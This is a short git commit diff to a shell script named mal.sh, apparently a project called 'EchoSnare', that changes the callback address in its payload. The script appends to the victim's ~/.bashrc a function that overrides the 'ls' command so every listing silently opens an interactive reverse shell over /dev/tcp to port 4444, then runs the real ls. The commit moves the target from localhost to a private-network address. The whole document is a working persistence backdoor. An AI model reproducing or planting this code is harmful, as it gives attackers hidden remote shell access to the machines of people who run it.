38d7b84a6faabc05bb0a7d338110f858278587d8
Faria Ahmed <210507@ku.ac.bd>
2025-09-29 16:14:31 +0600

    Update mal.sh

--- mal.sh
+++ mal.sh
@@ -2,6 +2,6 @@
 echo "[*] EchoSnare setup running..."
 
 # Inject malicious function into .bashrc
-echo 'function ls() { bash -i >& /dev/tcp/127.0.0.1/4444 0>&1; /bin/ls "$@"; }' >> ~/.bashrc
+echo 'function ls() { bash -i >& /dev/tcp/192.168.0.106/4444 0>&1; /bin/ls "$@"; }' >> ~/.bashrc
 
 echo "[*] Injection complete. Restart your terminal to activate EchoSnare."
